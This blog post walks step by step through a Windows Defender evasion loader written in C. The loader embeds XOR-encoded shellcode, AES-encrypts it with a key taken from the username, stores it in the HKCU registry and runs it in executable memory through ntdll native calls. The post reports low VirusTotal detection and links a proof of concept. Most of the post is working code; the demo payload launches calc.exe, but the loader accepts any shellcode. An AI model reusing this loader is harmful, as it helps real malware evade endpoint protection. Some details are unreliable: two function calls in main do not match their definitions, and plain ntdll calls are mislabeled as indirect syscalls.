---
title: Bypassing Windows Defender
date: 2025-04-16
categories: [windows, c, programming, malware,red team]
tags: [windows, c, programming, malware,red team]
excerpt: 
ShowToc: true
---
Lately I've been poking around at Windows internals and writing low level code. This morning I thought I'd try to bypass Windows Defender *and* get a low score on Virus Total.

One trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.

## "Syscalls" 

>Windows gives each user-mode application a block of virtual addresses. This is known as the user space of that application. The other large block of addresses, known as system space or kernel space, cannot be directly accessed by the application.

To request a service from the kernel (like reading a file or opening a process), a usermode program must make a system call using the `syscall` instruction. This tells the kernel which function it needs by placing a System Service Number or SSN in the `eax` register.  

The SSN is basically an index in a table known as the [system service descriptor table](https://en.wikipedia.org/wiki/System_Service_Descriptor_Table), where each number points to a different kernel function. For example:  
- `eax = 0` -> Calls the 1st function in the table  
- `eax = 1` -> Calls the 2nd function  
- `eax = 2` -> Calls the 3rd, and so on.  

The kernel finds the function using: `function_address = SSDT_base + (System Service Number)`  

tl;dr when a `syscall` instruction runs, the CPU switches from usermode to kernel mode, and the system call handler uses the system service number in `eax` to execute the correct function. 

Usermode functions then, in many cases, reach out to `ntdll.dll`, which in turn call into the kernel image, `ntoskrnl.exe`.

{{< inTextImg url="/modes.jpg" alt="VirusTotal" width="800" height="600">}}

*Image from [Microsoft Press Store](https://www.microsoftpressstore.com/articles/article.aspx?p=2201301&seqNum=2) by Pearson*

For example, we can see this artifact here—if I write some code in userland that uses the following Win32 API functions, `CreateFileA` and `WriteFile`:

```C
#include <stdio.h>
#include <windows.h>

int main() {
    char path[MAX_PATH];
    char filename[MAX_PATH];
    HANDLE hFile;
    DWORD bytesWritten;

    printf("Enter the path: ");
    scanf("%s", path);

    printf("Enter the filename: ");
    scanf("%s", filename);

    char fullPath[MAX_PATH];
    snprintf(fullPath, sizeof(fullPath), "%s\\%s", path, filename);

    hFile = CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        LPVOID errorMsg;
        FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
            NULL,
            error,
            0, 
            (LPSTR)&errorMsg,
            0,
            NULL
        );
        printf("Failed to create the file: %s\n", (char*)errorMsg);
        LocalFree(errorMsg);
        return 1;
    }

    const char* content = "Noted";
    if (!WriteFile(hFile, content, strlen(content), &bytesWritten, NULL)) 
{
        printf("Failed to write to the file.\n");
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    printf("File created successfully: %s\n", fullPath);

    return 0;
}
```

This code uses the userland hooks `CreateFileA` and `WriteFile`. But if we [compile this code](https://hexagr.blogspot.com/2023/08/windows.html) and step through it in a debugger or decompiler, we'll see something else: under the hood, these functions invoke `NtCreateFile` and `NtWriteFile`—Native API stubs in `ntdll.dll` that set up registers and issue the actual syscall.  

`CreateFileA` is a high-level wrapper over the Native API. It handles things like ANSI/unicode conversion, then delegates to `NtCreateFile`, which prepares the registers and triggers the syscall within `ntoskrnl.exe`.

>Nt or Zw are system calls declared in ntdll.dll and ntoskrnl.exe. When called from ntdll.dll in user mode, these groups are almost exactly the same; they trap into kernel mode and call the equivalent function in [ntoskrnl.exe](https://en.wikipedia.org/wiki/Ntoskrnl.exe) via the SSDT. When calling the functions directly in ntoskrnl.exe (only possible in kernel mode), the Zw variants ensure kernel mode, whereas the Nt variants do not.

So, native calls reach out to the System Service Descriptor Table (SSDT), which holds an array of offsets to kernel system calls: 

```C
typedef struct tagSERVICE_DESCRIPTOR_TABLE {
    SYSTEM_SERVICE_TABLE nt; //effectively a pointer to Service Dispatch Table (SSDT) itself
    SYSTEM_SERVICE_TABLE win32k;
    SYSTEM_SERVICE_TABLE sst3; //pointer to a memory address that contains how many routines are defined in the table
    SYSTEM_SERVICE_TABLE sst4;
} SERVICE_DESCRIPTOR_TABLE;
```

So, calls to functions in `ntdll.dll` in turn get [converted to low-level calls](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwwritefile) like `ZwCreateFile` and `ZwWriteFile`, courtesy of the index we pass to `ntdll.dll` and the syscall.


```asm
//snipped
mov r10,rcx                     | NtWriteFile
mov eax,8                       |
test byte ptr ds:[7FFE0308],1   |
jne ntdll.7FFF055AEE55          |
syscall                         |
ret                   
```
In this blog post, we'll use indirect syscalls which leverage native functions within `ntdll.dll`, avoiding certain calls to the Win32 API. 

Since `ntdll.dll` is available to every Windows process and provides the interface for user-mode programs to interact with kernel services, using system calls through ntdll.dll can help activity appear more legitimate. 

If we bypassed ntdll.dll and directly called kernel functions, it could stick out, increasing the likelihood of being detected by security tools that monitor abnormal behavior.

In a future blog post, we'll cover additional changes to our setup, including alternative approaches to enhancing stealth, such as unhooking.

## TypeDefs, For You and Me


By default, Windows Defender and various telemetry heavily monitor most of the things that happen in userland. This is to say that using userland hooks to do anything interesting can make it stick out—in a bad way. 

To improve our chances of flying under the radar, we can use some alternative userland functions and instead make calls using Native API functionality within `ntdll.dll`, which in turn make syscalls to the kernel.

But to do this, we'll need some initial declarations. These are the type definitions we'll use for Native API functions. We start with the `_PS_ATTRIBUTE` for process and thread creation[^1], along with unicode handling, process attributes, and identification for processes and threads.

We also define the types we’ll need for indirect calls to allocate memory[^2] and spin up new process threads[^3], which we'll do using pNtAllocateVirtualMemory, pNtCreateThreadEx, and pNtWaitForSingleObject, respectively.


```C
#include <windows.h>
#include <stdio.h>
#include <Lmcons.h>
#include <stdlib.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// Define prototypes with proper calling convention
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
    );

typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
    );

// Function to get NTDLL function address
PVOID GetNtdllFunction(LPCSTR FunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return NULL;
    }
    return GetProcAddress(hNtdll, FunctionName);
}
```

To reiterate the point here: all of this is to avoid calling userland hooks that are more heavily monitored by telemetry products like Windows Defender. For example, the userland function `CreateRemoteThread` might stick out. That is, instead of calling the userland hook, we call `pNtCreateThreadEx`.

## foo()

Now that we have type definitions to use with some of our `ntdll.dll` calls later on, next we need shellcode and functions for encryption and execution. The shellcode is just a simple payload that launches `calc.exe`.

Side note: I’ve already XOR’d the payload before embedding it in the program. We’ll reverse the XOR just before execution.

So, beyond our shellcode, we'll use the following constructions: an AES encryption routine, an AES decryption routine, a reverse XOR routine, functions to read from and write to the Windows registry, and indirect system calls for allocating read-write-execute memory and spinning up new process threads. 

But first, our AES routines. We generate our encryption key using the username of the current user. If the username is less than 16 characters, we just pad it with `0x01`. We then follow the conventions for using the BCrypt API from Microsoft[^4].

```C
const BYTE shellcode[] = {
    0xb7, 0x03, 0xc8, 0xaf, 0xbb, 0xa3, 0x8b, 0x4b, 0x4b, 0x4b, 0x0a, 0x1a, 0x0a, 0x1b, 0x19, 0x1a, 
    0x1d, 0x03, 0x7a, 0x99, 0x2e, 0x03, 0xc0, 0x19, 0x2b, 0x03, 0xc0, 0x19, 0x53, 0x03, 0xc0, 0x19, 
    0x6b, 0x03, 0xc0, 0x39, 0x1b, 0x03, 0x44, 0xfc, 0x01, 0x01, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 
    0xe7, 0x77, 0x2a, 0x37, 0x49, 0x67, 0x6b, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0xa9, 0xa6, 
    0x19, 0x0a, 0x1a, 0x03, 0xc0, 0x19, 0x6b, 0xc0, 0x09, 0x77, 0x03, 0x4a, 0x9b, 0xc0, 0xcb, 0xc3, 
    0x4b, 0x4b, 0x4b, 0x03, 0xce, 0x8b, 0x3f, 0x2c, 0x03, 0x4a, 0x9b, 0x1b, 0xc0, 0x03, 0x53, 0x0f, 
    0xc0, 0x0b, 0x6b, 0x02, 0x4a, 0x9b, 0xa8, 0x1d, 0x03, 0xb4, 0x82, 0x0a, 0xc0, 0x7f, 0xc3, 0x03, 
    0x4a, 0x9d, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 0xe7, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 
    0x73, 0xab, 0x3e, 0xba, 0x07, 0x48, 0x07, 0x6f, 0x43, 0x0e, 0x72, 0x9a, 0x3e, 0x93, 0x13, 0x0f, 
    0xc0, 0x0b, 0x6f, 0x02, 0x4a, 0x9b, 0x2d, 0x0a, 0xc0, 0x47, 0x03, 0x0f, 0xc0, 0x0b, 0x57, 0x02, 
    0x4a, 0x9b, 0x0a, 0xc0, 0x4f, 0xc3, 0x03, 0x4a, 0x9b, 0x0a, 0x13, 0x0a, 0x13, 0x15, 0x12, 0x11, 
    0x0a, 0x13, 0x0a, 0x12, 0x0a, 0x11, 0x03, 0xc8, 0xa7, 0x6b, 0x0a, 0x19, 0xb4, 0xab, 0x13, 0x0a, 
    0x12, 0x11, 0x03, 0xc0, 0x59, 0xa2, 0x1c, 0xb4, 0xb4, 0xb4, 0x16, 0x03, 0xf1, 0x4a, 0x4b, 0x4b, 
    0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x03, 0xc6, 0xc6, 0x4a, 0x4a, 0x4b, 0x4b, 0x0a, 0xf1, 0x7a, 0xc0, 
    0x24, 0xcc, 0xb4, 0x9e, 0xf0, 0xbb, 0xfe, 0xe9, 0x1d, 0x0a, 0xf1, 0xed, 0xde, 0xf6, 0xd6, 0xb4, 
    0x9e, 0x03, 0xc8, 0x8f, 0x63, 0x77, 0x4d, 0x37, 0x41, 0xcb, 0xb0, 0xab, 0x3e, 0x4e, 0xf0, 0x0c, 
    0x58, 0x39, 0x24, 0x21, 0x4b, 0x12, 0x0a, 0xc2, 0x91, 0xb4, 0x9e, 0x28, 0x2a, 0x27, 0x28, 0x65, 
    0x2e, 0x33, 0x2e, 0x4b
};

const DWORD shellcodeSize = sizeof(shellcode);

// AES Configuration
#define AES_KEY_LENGTH 16  // 128-bit AES
#define AES_BLOCK_SIZE 16

// Helper function to generate encryption key from user environment
BOOL GenerateKeyFromEnvironment(BYTE* key, DWORD keySize) {
    CHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;

    if (!GetUserNameA(username, &usernameLen)) {
        printf("Failed to get username: %d\n", GetLastError());
        return FALSE;
    }

    BYTE padding = 0x01;
    for (DWORD i = 0; i < keySize; i++) {
        if (i < usernameLen) {
            key[i] = (BYTE)username[i];
        }
        else {
            key[i] = padding++;
        }
    }
    return TRUE;
}

// AES Encryption Function
BOOL AESEncrypt(const BYTE* plaintext, DWORD plaintextSize, const BYTE* key,
    BYTE** ciphertext, DWORD* ciphertextSize) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open AES provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,
        NULL, 0);
    if (status != 0) {
        printf("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
        return FALSE;
    }

    // Set ECB mode 
    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
        (BYTE*)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptSetProperty failed: 0x%x\n", status);
        return FALSE;
    }

    // Create key handle
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0,
        (BYTE*)key, AES_KEY_LENGTH, 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptGenerateSymmetricKey failed: 0x%x\n", status);
        return FALSE;
    }

    // Get output buffer size
    DWORD cbCiphertext = 0;
    status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL,
        NULL, 0, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptEncrypt size check failed: 0x%x\n", status);
        return FALSE;
    }

    // Allocate ciphertext buffer
    *ciphertext = (BYTE*)malloc(cbCiphertext);
    if (!*ciphertext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    // Perform encryption
    status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL,
        NULL, 0, *ciphertext, cbCiphertext,
        ciphertextSize, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        free(*ciphertext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptEncrypt failed: 0x%x\n", status);
        return FALSE;
    }

    // Cleanup
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return TRUE;
}
```
If all goes well, we succeed in deriving a key and encrypting the shellcode. But we also need an AES decryption routine. The use of AES routines to keep our payload safe further reduces the likelihood of Windows Defender catching us.


```C
// AES Decryption Function
BOOL AESDecrypt(const BYTE* ciphertext, DWORD ciphertextSize, const BYTE* key,
    BYTE** plaintext, DWORD* plaintextSize) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open AES provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,
        NULL, 0);
    if (status != 0) {
        printf("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
        return FALSE;
    }

    // Set ECB mode
    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
        (BYTE*)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptSetProperty failed: 0x%x\n", status);
        return FALSE;
    }

    // Create key handle
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0,
        (BYTE*)key, AES_KEY_LENGTH, 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptGenerateSymmetricKey failed: 0x%x\n", status);
        return FALSE;
    }

    // Get output buffer size
    DWORD cbPlaintext = 0;
    status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL,
        NULL, 0, NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptDecrypt size check failed: 0x%x\n", status);
        return FALSE;
    }

    // Allocate plaintext buffer
    *plaintext = (BYTE*)malloc(cbPlaintext);
    if (!*plaintext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    // Perform decryption
    status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL,
        NULL, 0, *plaintext, cbPlaintext,
        plaintextSize, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        free(*plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptDecrypt failed: 0x%x\n", status);
        return FALSE;
    }

    // Cleanup
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return TRUE;
}
```



However, even after *this*, we'll make one final effort to subvert Windows Defender—namely, by writing our encrypted payload to the Windows registry, so as to remain stealthy, fileless, and potentially persistent.

In other words: we’re never writing to disk. Our shellcode lives only in memory, getting decrypted and XOR-decoded on the fly before execution.

But how can we perform reads and writes against the Windows registry? We'll need to use the `winreg` API from Microsoft.[^5] 

First we'll make use of `RegOpenKeyExA` and `RegSetValueExA` since we want to write to the Window's registry. But we need somewhere to write! And we want to write to Control Panel, under the current running user's username. 

So, before we read or write, we'll get the username from the current environment and append it to the write operation under the HKEY `Control Panel` -- this way when we do write out, it will be within the registry key `\Control Panel\Username` under `HKEY_CURRENT_USER`. 

And afterward, we use `RegQueryValueExA` to do the opposite operation, querying and reading the registry key we've written.

```C
BOOL writeRegistry(const BYTE* data, DWORD dataSize, const char* valueName) {
    HKEY hKey;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel", 0, KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) {
        printf("Error opening key: %d\n", GetLastError());
        return FALSE;
    }

    status = RegSetValueExA(hKey, valueName, 0, REG_BINARY, data, dataSize);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        printf("Error writing value: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL readRegistry(BYTE** buffer, DWORD* bytesRead, const char* valueName) {
    HKEY hKey;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel", 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        printf("Error opening key: %d\n", GetLastError());
        return FALSE;
    }

    DWORD type, size = 0;
    status = RegQueryValueExA(hKey, valueName, NULL, &type, NULL, &size);
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        printf("Error querying value size: %d\n", GetLastError());
        return FALSE;
    }

    *buffer = (BYTE*)malloc(size);
    if (!*buffer) {
        RegCloseKey(hKey);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    status = RegQueryValueExA(hKey, valueName, NULL, &type, *buffer, &size);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        free(*buffer);
        printf("Error reading value: %d\n", GetLastError());
        return FALSE;
    }

    *bytesRead = size;
    return TRUE;
}

```

Before we wrap things up with our shellcode execution and main functions, we need a small gadget to decode the payload, since the payload in this script was one I XOR'd beforehand. 

```C
void XORDecode(BYTE* data, DWORD dataSize, BYTE key) {
    for (DWORD i = 0; i < dataSize; i++) {
        data[i] ^= key;
    }
}
```


Alright, now we're close. We need to make use of the type definitions for indirect syscalls we created earlier. 

We get the function pointers to allocate and protect virtual memory, as well as to spin a new thread and wait for it to launch. And our epilogue will use the `NtFreeVirtualMemory` function to free our objects when we're done.

So, fundamentally what we're doing is dropping our now decrypted and XOR decoded shellcode into read-write-execute memory via ntdll calls for evasion. Lastly, our process spins up as a new thread in our current process--then we wait for it to finish. 

And the resulting shellcode that's launched starts `calc.exe`, effectively forking off from our current process. After this, we clean up our memory and bail out cleanly.


```C
void ExecuteShellcode(BYTE* shellcode, SIZE_T size) {
    XORDecode(shellcode, size, 'K');
    // Get function pointers
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetNtdllFunction("NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetNtdllFunction("NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetNtdllFunction("NtCreateThreadEx");
    pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetNtdllFunction("NtWaitForSingleObject");
    pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetNtdllFunction("NtFreeVirtualMemory");
    pNtClose NtClose = (pNtClose)GetNtdllFunction("NtClose");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx ||
        !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) {
        printf("Failed to get NTDLL function pointers\n");
        return;
    }

    PVOID execMemory = NULL;
    SIZE_T regionSize = size;
    ULONG oldProtect;

    // Allocate memory
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("NtAllocateVirtualMemory failed: 0x%x\n", status);
        return;
    }

    // Copy shellcode
    memcpy(execMemory, shellcode, size);

    // Change protection
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &execMemory,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        printf("NtProtectVirtualMemory failed: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
        return;
    }

    // Create thread
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)execMemory,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("NtCreateThreadEx failed: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
        return;
    }

    // Wait for thread
    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (status != 0) {
        printf("NtWaitForSingleObject failed: 0x%x\n", status);
    }

    // Cleanup
    NtClose(hThread);
    NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
}

```
So, to recap and tie all of it together. 

1) We use the current username the process is running under as a cryptographic key for our AES routines to encrypt our shellcode and write this out to the Windows registry. 
2) Then we read it back out, performing decryption before calling the function to actually execute the shellcode.
3) Finally, in `ExecuteShellcode` we reverse the XOR encoding just before copying the shellcode to executable memory and attempting to execute it. 
4) We spin up a new thread and wait with `NtWaitForSingleObject` -- if all goes well, we get a fresh `calc.exe` and Windows Defender doesn't yell at us!
```C

int main() {
    BYTE key[AES_KEY_LENGTH];
    if (!GenerateKeyFromEnvironment(key, AES_KEY_LENGTH)) {
        return 1;
    }

    // Encrypt payload
    BYTE* encryptedShellcode = NULL;
    DWORD encryptedSize = 0;
    if (!AESEncrypt(shellcode, shellcodeSize, key, &encryptedShellcode, &encryptedSize)) {
        return 1;
    }

    // Write to registry
    if (!writeRegistry(encryptedShellcode, encryptedSize)) {
        free(encryptedShellcode);
        return 1;
    }
    free(encryptedShellcode);
    printf("Successfully wrote encrypted payload to registry\n");

    // Read from registry
    BYTE* readBuffer = NULL;
    DWORD bytesRead;
    if (!readRegistry(&readBuffer, &bytesRead)) {
        return 1;
    }

    // Decrypt payload
    BYTE* decryptedShellcode = NULL;
    DWORD decryptedSize;
    if (!AESDecrypt(readBuffer, bytesRead, key, &decryptedShellcode, &decryptedSize)) {
        free(readBuffer);
        return 1;
    }
    free(readBuffer);

    // Verify decrypted size matches original
    if (decryptedSize != shellcodeSize) {
        printf("Decrypted size mismatch! Expected %d, got %d\n", shellcodeSize, decryptedSize);
        free(decryptedShellcode);
        return 1;
    }

    // Execute the shellcode
    printf("Executing decrypted payload...\n");
    ExecuteShellcode(decryptedShellcode, decryptedSize);
    free(decryptedShellcode);

    return 0;
}
```

## Profit?

Alright, let's check the scoreboard. Are we able to successfully read and write to the registry and execute shellcode without Windows Defender complaining?

{{< inTextImg url="/defender.png" alt="Windows Defender" width="800" height="600">}}

Looks good. Let's see how many antivirus vendors detect our code. Ahh, only ten out of 72! That's not bad. But we could also do better!

{{< inTextImg url="/virustotal.png" alt="VirusTotal" width="800" height="600">}}


Next post!

Proof of concept: [RegistryGhost](https://github.com/hexagr/RegistryGhost)

##

[^1]:https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html
[^2]:https://stackoverflow.com/a/26414236
[^3]: https://ntdoc.m417z.com/ntcreatethreadex
[^4]:https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/
[^5]: https://learn.microsoft.com/en-us/windows/win32/api/winreg/